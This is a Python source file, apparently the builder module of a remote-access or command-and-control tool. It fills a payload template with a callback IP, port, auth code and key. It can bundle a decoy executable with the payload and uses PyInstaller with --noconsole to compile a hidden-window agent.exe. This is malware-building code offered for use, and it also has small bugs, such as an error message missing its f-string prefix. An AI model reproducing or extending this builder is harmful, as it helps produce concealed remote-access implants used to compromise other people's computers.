from colorama import Fore, init
from .system import system
import PyInstaller.__main__
import shutil
import os

class builder():
    def build(type, ip, port, app='null'):
        with open("payloads/payload.py", 'r', encoding='utf-8') as payload:
            try:
                content = payload.read()
                new_content = content

                new_content = new_content.replace("__ipaddr__", ip)
                new_content = new_content.replace("12345", str(port))
                new_content = new_content.replace("'authcode'", str(system.getdata("authcode").encode()))
                new_content = new_content.replace("'RANDOM_KEY'", str(system.getdata("KEY").encode()))
                if  app !='null':
                    new_content = new_content.replace("app.exe", app)
                    new_content = new_content.replace("use_app = False", "use_app = True")
                payload.close()
            except Exception as error:
                    print(Fore.LIGHTRED_EX + f"[!] Error: {error}")
        with open("temp.py", 'w', encoding='utf-8') as file:
            if type == 'py':
                with open("build/agent.py", 'w', encoding='utf-8') as py_payload:
                    try:
                        py_payload.write(new_content)
                        print(Fore.LIGHTCYAN_EX + "Building Complete!")
                        file.close()
                        os.remove("temp.py")
                        py_payload.close()
                        system.clear_screen()
                        system.printheader()
                        print(Fore.LIGHTCYAN_EX + "[+] Build Complete!")
                        print(Fore.LIGHTYELLOW_EX + f"[+] /build/agent.py")
                        input('OK')
                    except Exception as error:
                        print(Fore.LIGHTRED_EX + "[!] Error: {error}")
            elif type == 'exe':
                try:
                    file.write(new_content)
                    print(Fore.LIGHTCYAN_EX + "[+] Created Payload...")
                    print(Fore.LIGHTCYAN_EX + "[+] Building Payload...")
                    if  app !='null' :
                        options = [
                        'temp.py',
                        '--onefile',
                        '--noconsole',
                        f'--add-data={app}:.'
                    ]
                    else:
                        options = [
                        'temp.py',
                        '--onefile',
                        '--noconsole']
                    file.close()
                    PyInstaller.__main__.run(options)

                    shutil.copy("dist/temp.exe", "build/agent.exe")
                    shutil.rmtree("build/temp")
                    shutil.rmtree("dist")
                    os.remove("temp.spec")
                    os.remove("temp.py")
                    system.clear_screen()
                    system.printheader()
                    print(Fore.LIGHTCYAN_EX + "[+] Build Complete!")
                    print(Fore.LIGHTYELLOW_EX + f"[+] /build/agent.exe")
                    input('OK')
                except Exception as error:
                    print(Fore.LIGHTRED_EX + "[-] Errror: {}".format(error))
            else:
                print(Fore.LIGHTRED_EX + f"[!] Error: Invalid Output Type {type}")
            file.close()